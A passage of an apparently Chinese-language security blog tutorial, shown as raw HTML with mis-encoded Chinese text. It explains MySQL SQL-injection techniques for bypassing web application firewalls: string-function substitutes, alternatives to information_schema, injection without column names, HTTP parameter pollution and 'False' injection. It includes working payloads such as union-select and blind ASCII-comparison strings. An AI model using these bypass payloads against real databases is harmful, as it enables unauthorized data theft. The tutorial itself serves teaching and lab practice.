class="comment"># rity</span></span><br><span class="line">select substr((select database()) from 6);    <span class="comment"># ity</span></span><br><span class="line">select substr((select database()) from 7);    <span class="comment"># ty</span></span><br><span class="line">select substr((select database()) from 8);    <span class="comment"># y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¹Ÿå¯ä»¥ä½¿ç”¨è´Ÿæ•°æ¥å€’ç€æˆªå–:</span></span><br><span class="line">select substr((select database())from(-1));    <span class="comment"># y</span></span><br><span class="line">select substr((select database())from(-2));    <span class="comment"># ty</span></span><br><span class="line">select substr((select database())from(-3));    <span class="comment"># ity</span></span><br><span class="line">select substr((select database())from(-4));    <span class="comment"># rity</span></span><br><span class="line">select substr((select database())from(-5));    <span class="comment"># urity</span></span><br><span class="line">select substr((select database())from(-6));    <span class="comment"># curity</span></span><br><span class="line">select substr((select database())from(-7));    <span class="comment"># ecurity</span></span><br><span class="line">select substr((select database())from(-8));    <span class="comment"># security</span></span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡</strong><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ offset è¯­å¥æ›¿æ¢ limit è¯­å¥é‡Œçš„é€—å·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="built_in">users</span> <span class="built_in">limit</span> 1 offset 2;</span><br><span class="line"><span class="comment"># æ­¤æ—¶ limit 1 offset 2 å¯ä»¥ä»£æ›¿ limit 1,2</span></span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨joinä¸åˆ«åç»•è¿‡</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user from user <span class="built_in">where</span> user=<span class="string">&#x27;a&#x27;</span>union(select*from((select`table_name`from`information_schema`.`tables`<span class="built_in">where</span>`table_schema`=<span class="string">&#x27;mysql&#x27;</span>)`a`<span class="built_in">join</span>(select`table_type`from`information_schema`.`tables`<span class="built_in">where</span>`table_schema`=<span class="string">&#x27;mysql&#x27;</span>)b));</span><br></pre></td></tr></table></figure><p><strong>è¿‡æ»¤information_schemaç»•è¿‡ä¸æ— åˆ—åæ³¨å…¥</strong></p><p>å½“è¿‡æ»¤oræ—¶ï¼Œè¿™ä¸ªåº“å°±ä¼šè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆmysqlåœ¨è¢«wafç¦æ‰äº†information_schemaåº“åè¿˜èƒ½æœ‰å“ªäº›åˆ©ç”¨æ€è·¯å‘¢ï¼Ÿ</p><p>information_schema ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªåº“åœ¨mysqlä¸­å°±æ˜¯ä¸ªä¿¡æ¯æ•°æ®åº“ï¼Œå®ƒä¿å­˜ç€mysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåç­‰ã€‚åœ¨æ³¨å…¥ä¸­ï¼Œinfromation_schemaåº“çš„ä½œç”¨æ— éå°±æ˜¯å¯ä»¥è·å–åˆ°table_schemaã€table_nameã€column_nameè¿™äº›æ•°æ®åº“å†…çš„ä¿¡æ¯ã€‚</p><p>èƒ½å¤Ÿä»£æ›¿information_schemaçš„æœ‰ï¼š<br>sys.schema_auto_increment_columns åªæ˜¾ç¤ºæœ‰è‡ªå¢çš„è¡¨<br>sys.schema_table_statistics_with_buffer<br>x$schema_table_statistics_with_buffer</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> <span class="built_in">id</span> = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer <span class="built_in">where</span> table_schema=database();</span><br></pre></td></tr></table></figure><p>mysql.innodb_table_stats<br>mysql.innodb_table_index</p><p>ä»¥ä¸Šå¤§éƒ¨åˆ†ç‰¹æ®Šæ•°æ®åº“éƒ½æ˜¯åœ¨ mysql5.7 ä»¥åçš„ç‰ˆæœ¬æ‰æœ‰ï¼Œå¹¶ä¸”è¦è®¿é—®sysæ•°æ®åº“éœ€è¦æœ‰ç›¸åº”çš„æƒé™ã€‚</p><p>ä½†æ˜¯åœ¨ä½¿ç”¨ä¸Šé¢çš„åä¸¤ä¸ªè¡¨æ¥è·å–è¡¨åä¹‹åselect group_concat(table_name) from mysql.innodb_table_statsï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•è·å¾—åˆ—çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦é‡‡ç”¨æ— åˆ—åæ³¨å…¥çš„åŠæ³•ã€‚</p><h3 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h3><p>123æ³•<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›æŸ¥è¯¢ä¸Šçš„æŠ€å·§æ¥è¿›è¡Œæ— åˆ—åã€è¡¨åçš„æ³¨å…¥ã€‚</p><p>åœ¨æˆ‘ä»¬ç›´æ¥select 1,2,3æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„è¡¨<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559936.png"></p><p>å¦‚å›¾æ‰€è§åˆ—åä¼šè¢«å®šä¹‰ä¸º1ï¼Œ2ï¼Œ3</p><p>å½“æˆ‘ä»¬ç»“åˆäº†unionè”åˆæŸ¥è¯¢ä¹‹å</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241559064.png"></p><p>å¦‚å›¾ï¼Œæˆ‘ä»¬çš„åˆ—åè¢«æ›¿æ¢ä¸ºäº†å¯¹åº”çš„æ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æ•°å­—æ¥å¯¹åº”åˆ—ï¼Œå¦‚ 3 å¯¹åº”äº†è¡¨é‡Œé¢çš„ passwordï¼Œè¿›è€Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ è¿™æ ·çš„æŸ¥è¯¢è¯­å¥æ¥æŸ¥è¯¢passwordï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from <span class="built_in">users</span>)a;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600996.png"><br>æœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½å</p><p>å½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œåå¼•å·ä¼šè¢«è¿‡æ»¤ã€‚å½“åå¼•å·ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure><p>join<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çˆ†é”™ï¼Œå€ŸåŠ©joinå’Œusingçˆ†å‡ºåˆ—åï¼Œidä¸ºç¬¬ä¸€åˆ—ï¼Œusernameä¸ºç¬¬äºŒåˆ—ï¼Œå¯ä»¥é€ä¸ªçˆ†å‡ºï¼Œçˆ†å‡ºå…¨éƒ¨åˆ—åä¹‹åå³å¯å¾—åˆ°åˆ—å†…æ•°æ®ã€‚<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png"></p><h3 id="è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡"><a href="#è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡"></a>è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡</h3><p>è¿‡æ»¤ if è¯­å¥ç»•è¿‡<br>å¦‚æœè¿‡æ»¤äº† if å…³é”®å­—çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨case whenè¯­å¥ç»•è¿‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(condition,1,0) &lt;=&gt; <span class="keyword">case</span> when condition <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ifè¯­å¥å’Œcase whenè¯­å¥æ˜¯ç­‰æ•ˆçš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0&#x27;</span> or <span class="keyword">case</span> when ascii(substr((select database()),1,1))&gt;97 <span class="keyword">then</span> 1 <span class="keyword">else</span> 0 end<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤-substr-ç»•è¿‡"><a href="#è¿‡æ»¤-substr-ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ substr ç»•è¿‡"></a>è¿‡æ»¤ substr ç»•è¿‡</h3><ul><li><p>ä½¿ç”¨ lpad&#x2F;lpad<br>ä½¿ç”¨lpad()å’Œrpad()ç»•è¿‡substr()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select lpad((select database()),1,1)    // s</span><br><span class="line">select lpad((select database()),2,1)    // se</span><br><span class="line">select lpad((select database()),3,1)    // sec</span><br><span class="line">select lpad((select database()),4,1)    // secu</span><br><span class="line">select lpad((select database()),5,1)    // secur</span><br><span class="line">select lpad((select database()),6,1)    // securi</span><br><span class="line">select lpad((select database()),7,1)    // securit</span><br><span class="line">select lpad((select database()),8,1)    // security</span><br><span class="line"></span><br><span class="line">select rpad((select database()),1,1)    // s</span><br><span class="line">select rpad((select database()),2,1)    // se</span><br><span class="line">select rpad((select database()),3,1)    // sec</span><br><span class="line">select rpad((select database()),4,1)    // secu</span><br><span class="line">select rpad((select database()),5,1)    // secur</span><br><span class="line">select rpad((select database()),6,1)    // securi</span><br><span class="line">select rpad((select database()),7,1)    // securit</span><br><span class="line">select rpad((select database()),8,1)    // security</span><br></pre></td></tr></table></figure><p>lpadï¼šå‡½æ•°è¯­æ³•ï¼šlpad(str1,length,str2)ã€‚å…¶ä¸­str1æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œlengthæ˜¯ç»“æœå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œstr2æ˜¯ä¸€ä¸ªå¡«å……å­—ç¬¦ä¸²ã€‚å¦‚æœstr1çš„é•¿åº¦æ²¡æœ‰lengthé‚£ä¹ˆé•¿ï¼Œåˆ™ä½¿ç”¨str2å¡«å……ï¼›å¦‚æœstr1çš„é•¿åº¦å¤§äºlengthï¼Œåˆ™æˆªæ–­ã€‚<br>rpadï¼šåŒç†</p></li><li><p>ä½¿ç”¨left()ç»•è¿‡substr()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select left((select database()),1)    // s</span><br><span class="line">select left((select database()),2)    // se</span><br><span class="line">select left((select database()),3)    // sec</span><br><span class="line">select left((select database()),4)    // secu</span><br><span class="line">select left((select database()),5)    // secur</span><br><span class="line">select left((select database()),6)    // securi</span><br><span class="line">select left((select database()),7)    // securit</span><br><span class="line">select left((select database()),8)    // security</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨mid()ç»•è¿‡substr()</p></li></ul><p>mid()å‡½æ•°çš„ä½¿ç”¨å°±å’Œsubstr()å‡½æ•°ä¸€æ ·äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select mid((select database()),1,1)    // s</span><br><span class="line">select mid((select database()),2,1)    // e</span><br><span class="line">select mid((select database()),3,1)    // c</span><br><span class="line">select mid((select database()),4,1)    // u</span><br><span class="line">select mid((select database()),5,1)    // r</span><br><span class="line">......</span><br></pre></td></tr></table></figure><ul><li>è¿˜å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ªç¥å¥‡çš„ä¸œè¥¿ç»•è¿‡<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s</span><br><span class="line">select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e</span><br><span class="line">select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c</span><br><span class="line">select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u</span><br><span class="line">select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r</span><br><span class="line">select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i</span><br><span class="line">select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t</span><br><span class="line">......</span><br></pre></td></tr></table></figure>INSERT( string , position , number , string2 )</li></ul><p>INSERT()å‡½æ•°åœ¨æŒ‡å®šä½ç½®çš„å­—ç¬¦ä¸²ä¸­æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ’å…¥ä¸€å®šæ•°é‡çš„å­—ç¬¦ã€‚</p><h3 id="HTTPå‚æ•°æ±¡æŸ“-HPP-æ¼æ´ç»•è¿‡-Waf"><a href="#HTTPå‚æ•°æ±¡æŸ“-HPP-æ¼æ´ç»•è¿‡-Waf" class="headerlink" title="HTTPå‚æ•°æ±¡æŸ“(HPP)æ¼æ´ç»•è¿‡ Waf"></a>HTTPå‚æ•°æ±¡æŸ“(HPP)æ¼æ´ç»•è¿‡ Waf</h3><p>HPPæ˜¯HTTP Parameter Pollutionçš„ç¼©å†™ï¼Œæ„ä¸ºHTTPå‚æ•°æ±¡æŸ“ã€‚æµè§ˆå™¨åœ¨è·ŸæœåŠ¡å™¨è¿›è¡Œäº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å¾€å¾€ä¼šåœ¨GETæˆ–POSTè¯·æ±‚é‡Œé¢å¸¦ä¸Šå‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šä»¥ é”®-å€¼ å¯¹çš„å½¢åŠ¿å‡ºç°ï¼Œé€šå¸¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­ï¼ŒåŒæ ·åç§°çš„å‚æ•°åªä¼šå‡ºç°ä¸€æ¬¡ã€‚</p><p>ä½†æ˜¯åœ¨HTTPåè®®ä¸­æ˜¯å…è®¸åŒæ ·åç§°çš„å‚æ•°å‡ºç°å¤šæ¬¡çš„ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªé“¾æ¥ï¼š<a href="http://www.baidu.com/?name=aa&amp;name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF">http://www.baidu.com?name=aa&amp;name=bbï¼Œé’ˆå¯¹åŒæ ·åç§°çš„å‚æ•°å‡ºç°å¤šæ¬¡çš„æƒ…å†µï¼Œä¸åŒçš„æœåŠ¡å™¨çš„å¤„ç†æ–¹å¼ä¼šä¸ä¸€æ ·ã€‚æœ‰çš„æœåŠ¡å™¨æ˜¯å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯</a> name&#x3D;aaã€‚æœ‰çš„æœåŠ¡å™¨æ˜¯å–ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ name&#x3D;bbã€‚æœ‰çš„æœåŠ¡å™¨ä¸¤ä¸ªå‚æ•°éƒ½å–ï¼Œä¹Ÿå°±æ˜¯ name&#x3D;aa,bbã€‚è¿™ç§ç‰¹æ€§åœ¨ç»•è¿‡ä¸€äº›æœåŠ¡å™¨ç«¯çš„é€»è¾‘åˆ¤æ–­æ—¶ï¼Œéå¸¸æœ‰ç”¨ã€‚</p><p>HPPæ¼æ´ï¼Œä¸WebæœåŠ¡å™¨ç¯å¢ƒã€æœåŠ¡ç«¯ä½¿ç”¨çš„è„šæœ¬æœ‰å…³ã€‚å¦‚ä¸‹æ˜¯ä¸åŒç±»å‹çš„WebæœåŠ¡å™¨å¯¹äºå‡ºç°å¤šä¸ªå‚æ•°æ—¶çš„é€‰æ‹©ï¼š</p><table><thead><tr><th>è¡¨å¤´Web æœåŠ¡å™¨</th><th>å‚æ•°è·å–å‡½æ•°</th><th>è·å–åˆ°çš„å‚æ•°</th></tr></thead><tbody><tr><td>PHP&#x2F;Apache</td><td>$_GET[â€˜aâ€™]</td><td>Last</td></tr><tr><td>JSP&#x2F;Tomcat</td><td>Request.getParameter(â€˜aâ€™)</td><td>First</td></tr><tr><td>Perl(CGI)&#x2F;Apache</td><td>Param(â€˜aâ€™)</td><td>First</td></tr><tr><td>Python&#x2F;Apache</td><td>getvalue(â€˜aâ€™)</td><td>All</td></tr><tr><td>ASP&#x2F;IIS</td><td>Request.QueryString(â€˜aâ€™)</td><td>All</td></tr></tbody></table><p>å‡è®¾æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†æ˜¯Tomcatä¸ºå¼•æ“çš„JSP&#x2F;Tomcatå‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯Apacheä¸ºå¼•æ“çš„PHP&#x2F;Apacheå‹æœåŠ¡å™¨ã€‚ç¬¬ä¸€éƒ¨åˆ†çš„JSP&#x2F;TomcatæœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFï¼Œè€ŒçœŸæ­£æä¾›WebæœåŠ¡çš„æ˜¯PHP&#x2F;ApacheæœåŠ¡å™¨ã€‚é‚£ä¹ˆæœåŠ¡ç«¯çš„å·¥ä½œæµç¨‹ä¸ºï¼šå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ°JSP&#x2F;TomcatæœåŠ¡å™¨ï¼Œç„¶åJSP&#x2F;TomcatæœåŠ¡å™¨å†å‘PHP&#x2F;ApacheæœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚</p><p>é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨ä¸åŒæœåŠ¡å™¨è§£æå‚æ•°çš„ä½ç½®ä¸åŒç»•è¿‡WAFçš„æ£€æµ‹ã€‚æ¥çœ‹çœ‹å¦‚ä¸‹è¯·æ±‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.jsp?<span class="built_in">id</span>=1&amp;<span class="built_in">id</span>=2</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¿‡JSP&#x2F;TomcatæœåŠ¡å™¨ï¼ŒJSP&#x2F;TomcatæœåŠ¡å™¨è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥JSP&#x2F;TomcatæœåŠ¡å™¨å»è¯·æ±‚PHP&#x2F;ApacheæœåŠ¡å™¨ï¼ŒPHP&#x2F;ApacheæœåŠ¡å™¨è§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚å‡è®¾JSP&#x2F;TomcatæœåŠ¡å™¨ä½œä¸ºWafå¯¹ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œæ£€æµ‹ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸­ä¼ payloadæ¥ç»•è¿‡Wafã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.jsp?<span class="built_in">id</span>=1&amp;<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></figure><p>è¿™æ · Waf å¯èƒ½åªæ£€æµ‹ç¬¬ä¸€ä¸ªå‚æ•° id&#x3D;1ï¼Œè€ŒPHPè„šæœ¬çœŸæ­£è¯†åˆ«çš„æ˜¯ id&#x3D;select database()â€“+<br>[ä¾‹é¢˜]Sql-Labs Less-29</p><h3 id="False-æ³¨å…¥ç»•è¿‡"><a href="#False-æ³¨å…¥ç»•è¿‡" class="headerlink" title="False æ³¨å…¥ç»•è¿‡"></a>False æ³¨å…¥ç»•è¿‡</h3><p><strong>False æ³¨å…¥åŸç†</strong><br>å‰é¢æˆ‘ä»¬å­¦è¿‡çš„æ³¨å…¥éƒ½æ˜¯åŸºäº1&#x3D;1è¿™æ ·æ¯”è¾ƒçš„æ™®é€šæ³¨å…¥ï¼Œä¸‹é¢æ¥è¯´ä¸€è¯´ False æ³¨å…¥ï¼Œåˆ©ç”¨ False æˆ‘ä»¬å¯ä»¥ç»•è¿‡ä¸€äº›ç‰¹å®šçš„ WAF ä»¥åŠä¸€äº›æœªæ¥ä¸ç¡®å®šçš„å› ç´ ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹ä¸‹é¢è¿™ä¸ªsqlæŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> uesrname = 0;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png"></p><p>ä¸ºä»€ä¹ˆ username &#x3D; 0 ä¼šå¯¼è‡´è¿”å›æ•°æ®ï¼Œè€Œä¸”æ˜¯å…¨éƒ¨æ•°æ®å‘¢ï¼Ÿ</p><p>è¿™å°±æ˜¯ä¸€ä¸ªåŸºäº False æ³¨å…¥çš„ä¾‹å­ï¼Œä¸‹é¢å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username = 0;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png"></p><p>å’Œä¸Šé¢æ˜¯åŒä¸€ä¸ªè¡¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œåªè¿”å›äº†ä¸¤ç»„æ•°æ®å‘¢ï¼Ÿè¯´åˆ°è¿™é‡Œä¸å¾—ä¸è¯´ä¸€è¯´æœ‰å…³äº MYSQL çš„éšå¼ç±»å‹è½¬æ¢ã€‚</p><p>MYSQL çš„éšå¼ç±»å‹è½¬æ¢ï¼Œå³å½“å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šæŠŠå­—ç¬¦ä¸²è½¬ä¸ºæµ®ç‚¹æ•°ï¼Œè€Œå­—ç¬¦ä¸²è½¬æ¢ä¸ºæµ®ç‚¹æ•°å¾ˆæ˜æ˜¾ä¼šè½¬æ¢å¤±è´¥ï¼Œè¿™æ—¶å°±ä¼šäº§ç”Ÿä¸€ä¸ªwarningï¼Œè½¬æ¢çš„ç»“æœä¸º0ï¼Œç„¶å0 &#x3D; 0 è¿”å›çš„æ˜¯ True ï¼Œè¿™æ ·å°±å°†è¡¨ä¸­çš„æ•°æ®å…¨éƒ¨è¿”å›äº†ã€‚ä½†å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æ˜¯æ•°å­—è¯è¿˜æ˜¯ä¼šä»æ•°å­—éƒ¨åˆ†æˆªæ–­ï¼Œè½¬æ¢ä¸ºæ•°å­—è¿›è¡Œæ¯”è¾ƒï¼Œåœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­ï¼Œpasswd å­—æ®µä¸­æœ‰ä¸€ä¸ªå€¼æ˜¯ä»¥æ•°å­—1å¼€å¤´çš„å¹¶éä¸º0ï¼Œå†è¿›è¡Œ passwd &#x3D; 0 æ¯”è¾ƒæ—¶ï¼Œä¼šä»1å¼€å§‹æˆªæ–­ï¼Œ1 &#x3D; 0 ä¸æˆç«‹ï¼Œå½“ç„¶å°±åªè¿”å›ä¸¤æ¡æ•°æ®äº†ã€‚è¿™å°±æ˜¯ MYSQL False æ³¨å…¥çš„åŸç†ã€‚</p><p><strong>False æ³¨å…¥åˆ©ç”¨</strong><br>ä¸‹é¢æˆ‘ä»¬è®²è®² False æ³¨å…¥å¦‚ä½•åˆ©ç”¨ï¼ŒåŠå¦‚ä½•æ„é€  False æ³¨å…¥çš„åˆ©ç”¨ç‚¹ã€‚åœ¨å®é™…ä¸­æˆ‘ä»¬æ¥è§¦åˆ°çš„è¯­å¥éƒ½æ˜¯å¸¦æœ‰å¼•å·çš„ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user <span class="built_in">where</span> username =<span class="string">&#x27;.$username.&#x27;</span>;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¦‚ä½•ç»•è¿‡å¼•å·æ„é€ å‡º 0 è¿™ä¸ªå€¼å‘¢ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›å¤„ç†æ¥æ„é€ falseæ³¨å…¥çš„åˆ©ç”¨ç‚¹ï¼Ÿ</p><p>å¯ä»¥ä½¿ç”¨çš„å§¿åŠ¿æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ä¸‹é¢çš„ç®—æ•°è¿ç®—ï¼š</p><ul><li>åˆ©ç”¨ç®—æ•°è¿ç®—<br>åŠ ï¼š+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;+&#x27;</span>, æ‹¼æ¥çš„è¯­å¥: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>+<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>å‡ï¼š-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;-&#x27;</span>, æ‹¼æ¥çš„è¯­å¥: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>-<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ul><p>ä¹˜ï¼š*</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;*&#x27;</span>, æ‹¼æ¥çš„è¯­å¥: select * from user <span class="built_in">where</span> username =<span class="string">&#x27;&#x27;</span>*<span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>é™¤ï¼š&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span class="string">&#x27;/6#, æ‹¼æ¥çš„è¯­å¥: select * from user where username =&#x27;</span><span class="string">&#x27;/6#&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å–ä½™ï¼š%</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ’å…¥<span 